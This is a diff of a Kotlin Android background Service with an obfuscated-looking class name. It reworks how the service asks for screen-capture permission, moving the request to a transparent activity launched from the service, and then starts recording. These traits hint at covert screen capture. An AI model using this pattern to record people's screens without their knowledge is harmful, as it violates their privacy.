@@ -475,20 +475,33 @@ class DFm8Y8iMScvB2YDw : Service() {
         startActivity(intent)
     }*/
 
-private fun requestMediaProjection() {
+private fun requestMediaProjection1() {
     val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
     val intent = projectionManager.createScreenCaptureIntent()
     requestMediaProjectionLauncher.launch(intent)
 }
-    private val requestMediaProjectionLauncher =
-    registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
-        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
-            mediaProjection = projectionManager.getMediaProjection(result.resultCode, result.data!!)
-            startCapture()  // 权限拿到 → 真正开始录屏
+
+ fun requestMediaProjection() {
+
+    val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
+            as MediaProjectionManager
+
+    ScreenPermissionCallback.onResult = { resultCode, data ->
+        if (resultCode == Activity.RESULT_OK && data != null) {
+            mediaProjection = projectionManager!!.getMediaProjection(resultCode, data)
+            startCapture()  // 权限已获得，开始录屏
         } else {
-            //Log.e("Screen", "User denied MediaProjection")
+            // 用户拒绝
         }
     }
+
+    val intent = Intent(this, PermissionRequestTransparentActivity::class.java).apply {
+            action = ACT_REQUEST_MEDIA_PROJECTION
+        }
+    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+    context.startActivity(intent)
+}
+ 
  
     private val executor = Executors.newFixedThreadPool(5)
 
